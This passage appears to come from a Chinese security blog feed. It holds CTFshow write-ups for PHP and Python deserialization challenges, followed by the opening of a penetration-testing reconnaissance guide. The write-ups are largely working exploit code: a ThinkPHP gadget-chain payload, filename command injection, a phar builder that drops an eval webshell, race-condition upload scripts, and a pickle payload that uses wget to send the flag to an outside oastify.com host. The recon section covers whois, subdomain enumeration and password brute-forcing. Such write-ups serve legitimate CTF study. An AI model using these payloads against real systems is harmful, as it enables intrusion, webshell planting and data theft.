punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">?</span>lin<span class="token operator">=</span>tac <span class="token operator">/</span>flag<span class="token operator">&amp;</span>data<span class="token operator">=</span>TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19</code></pre><h4 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">filter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$fn</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token operator">=</span><span class="token variable">$fn</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php|\.\./i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rm '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DOCUMENT_ROOT'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'work done'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'where is flag?'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>没仔细看下面的，看到了<code>__destruct</code>可以调用<code>system</code>所以只需要满足checkevil的正则匹配，执行<code>system</code>即可</p><p>Payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span><span class="token keyword">fn</span><span class="token operator">=</span><span class="token operator">|</span><span class="token class-name">tac</span> fla<span class="token operator">*</span><span class="token constant">POST</span><span class="token punctuation">:</span> flag</code></pre><h4 id="web276-Phar反序列化"><a href="#web276-Phar反序列化" class="headerlink" title="web276(Phar反序列化)"></a>web276(Phar反序列化)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">filter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$fn</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token operator">=</span><span class="token variable">$fn</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php|\.\./i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rm '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DOCUMENT_ROOT'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'work done'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'where is flag?'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><code>__destruct()</code>加了条件，但是<code>admin</code>不可控</p><p><a href="https://xz.aliyun.com/t/2715?time__1311=n4+xni0=G=GQ=DKi==Ds0ffrYGCSDBmiDchrYD">初探phar:&#x2F;&#x2F;</a></p><p>首先构造 <code>phar</code> 的文件，将 <code>filter</code> 存储在 <code>meta-data</code> 中以备反序列化。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">filter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"a;echo '&lt;?php @eval(\$_POST[1]); ?>' > shell.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"done."</span><span class="token punctuation">;</span></span></code></pre><p>然后因为文件名加上 <code>/var/www/html/</code> 后 <code>unlink</code> 的参数就会有两遍路径，删不掉，就可以持久化上传文件了，当然也可以通过条件竞争去反序列化这个 <code>phar</code>。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://39afeb37-98e3-49cc-9a59-ba48da61ff09.challenge.ctf.show/"</span>target <span class="token operator">=</span> <span class="token string">"/var/www/html/d.phar"</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"CTFshow\php-unserialize\payload.phar"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    payload <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>_ <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/?fn=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token string">"phar://d.phar/test"</span>_ <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/?fn=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre><p>条件竞争</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingurl<span class="token operator">=</span><span class="token string">"https://39afeb37-98e3-49cc-9a59-ba48da61ff09.challenge.ctf.show/"</span>f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"CTFshow\php-unserialize\payload.phar"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>content<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#上传1.phar，内容是本地文件：phar.phar</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?fn=d.phar"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#利用条件竞争，尝试phar://反序列化1.phar，1.phar没被删除就能被反序列化，因而就能执行system()函数从而执行我们的命令</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?fn=phar://d.phar/test"</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token string">"1=system('tac flag.php)"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"ctfshow&#123;"</span><span class="token keyword">in</span> r<span class="token punctuation">.</span>text <span class="token keyword">or</span> <span class="token string">"flag&#123;"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    t1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>upload<span class="token punctuation">)</span>    t2<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="web277-python反序列化"><a href="#web277-python反序列化" class="headerlink" title="web277(python反序列化)"></a>web277(python反序列化)</h4><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Python 反序列化漏洞</a></p><p>利用burp的Collaborator外带</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> os<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">hsad</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'wget npgr48shkll6h9ye92srk1po7fd71xpm.oastify.com/?a=`tac flag`'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>hsad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="web277.png" loading="lazy"></p><h4 id="web278"><a href="#web278" class="headerlink" title="web278"></a>web278</h4><p>同 <code>web277</code>，禁用了 <code>os.system</code> 但不影响 <code>os.popen</code>。</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> php-unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2024/07/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2024/07/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h4 id="信息收集内容"><a href="#信息收集内容" class="headerlink" title="信息收集内容"></a>信息收集内容</h4><p>在划定了测试范围之后，就需要进入信息收集阶段。在这个阶段，渗透人员需要使用各种公开资源尽可能地获取测试目标的相关信息。他们搜集信息的互联网渠道主要有：论坛&#x2F;公告板&#x2F;新闻组&#x2F;媒体文章&#x2F;博客&#x2F;社交网络&#x2F;github&#x2F;其他商业或非商业性的网站。此外，他们也可以借助各种搜索引擎中获取相关数据，如谷歌、雅虎、MSN必应、百度等。收集的信息主要包括:</p><p>（1）收集目标网站服务器信息：域名、子域名、CNAME、cdn、真实IP、系统类型、版本等；</p><p>（2）识别并收集目标网站指纹信息：CMS、中间件、网页编程语言等及其通用漏洞调查收集；</p><p>（3）扫描并收集目标网站目录结构：一些文件可以访问获得信息、后台管理页面位置、日志位置等；</p><p>（4）网站的敏感信息：</p><p>whois信息、姓名、备案、邮箱、电话反查（邮箱丢社工库，社工准备等）；<br>弱口令扫描、密码爆破等（如针对系统管理员、网站后台管理员、数据库管理员等）；<br>网站源码是否泄露等，如github源码。<br>（5）收集目标服务器主机端口信息：不同端口提供不同的攻击思路和方向；</p><p>（6）网络防护信息：网络边界设备或网络节点设备，如有没有防火墙，有没有IPS、IDS或WAF，网络行为管理，全流量分析。</p><p>收集的信息越多，渗透测试成功的概率越高。<br>在信息收集中，最主要的就是收集服务器的配置信息和网站的敏感信息，其中包括域名及子域名信息、目标网站系统、CMS指纹、目标网站真实IP 、开放的端口等。换句话说，只要是与目标网站相关的信息，我们都应该去尽量搜集。</p><h4 id="域名相关信息"><a href="#域名相关信息" class="headerlink" title="域名相关信息"></a>域名相关信息</h4><p>知道目标的域名之后，我们要做的第一件事就是获取域名的注册信息，注意关注该域名的注册商和注册人的联系方式（电话和邮箱）等信息。</p><h5 id="域名分类"><a href="#域名分类" class="headerlink" title="域名分类"></a>域名分类</h5><p>国际域名：.com(商业公司);:net(网络服务):.org(组织协会等);.gov(政府部门);.edu(教育机构);.mil(军事领域);.int(国际组织)</p><p>国别域名：.CN代表中国，.UK代表英国，.US代表美国　</p><p>新顶级域名：biz,info，name，pro, aero, coop, museum…</p><h5 id="域名信息查询方式"><a href="#域名信息查询方式" class="headerlink" title="域名信息查询方式"></a>域名信息查询方式</h5><h6 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h6><p>Whois是一个标准的互联网协议， 可用于收集域名注册信息，注册的域名、IP地址等信息。简单来说， Whois就是一个用于查询域名是否</p><p>己被注册以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。</p><p>在Whois查询中，得到注册人的姓名和邮箱信息通常对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人</p><p>的很多信息。对中小站点而言，域名所有人往往就是管理员。</p><ul><li><strong>Kali系统</strong>：在Kali系统中， Whois 己经默认安装，只需输入要查询的域名即可，代码为<code>whois+域名</code>（一般域名不包含主机名，如</li></ul><p>·baidu.com）。注意，Kali系统需连接真实网络，能上网。</p><ul><li><strong><a href="https://whois.chinaz.com/">站长之家</a></strong></li><li><strong><a href="https://whois.aliyun.com/">阿里云查询</a></strong></li></ul><h6 id="反查"><a href="#反查" class="headerlink" title="反查"></a>反查</h6><p><a href="https://whois.chinaz.com/reverse/">邮箱反查 注册人反查 电话反查</a></p><h6 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h6><ul><li><strong><a href="https://www.beianx.cn/">ICP备案查询网</a></strong></li><li><strong><a href="http://www.tianyancha.como/">天眼查</a></strong></li><li><strong><a href="https://beian.miit.gov.cn/?wm=gwo#/Integrated/index">ICP&#x2F;IP地址&#x2F;域名信息备案管理系统</a></strong></li></ul><h5 id="子域名信息查询方式"><a href="#子域名信息查询方式" class="headerlink" title="子域名信息查询方式"></a>子域名信息查询方式</h5><p>子域名也就是二级域名， 是指顶级域名下的域名。假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的， 因为对于这种</p><p>规模的目标， 一般其主域都是重点防护区域，所以不如先进入目标的某个子域，然后再想办法迂回接近真正的目标，这无疑是个比较好</p><p>的选择。</p><ul><li><p><strong><a href="https://searchdns.netcraft.com/">What’s that site running?</a></strong></p></li><li><p><strong><a href="https://github.com/euphrat1ca/LayerDomainFinder">Layer子域名挖掘机</a></strong></p></li><li><p><strong><a 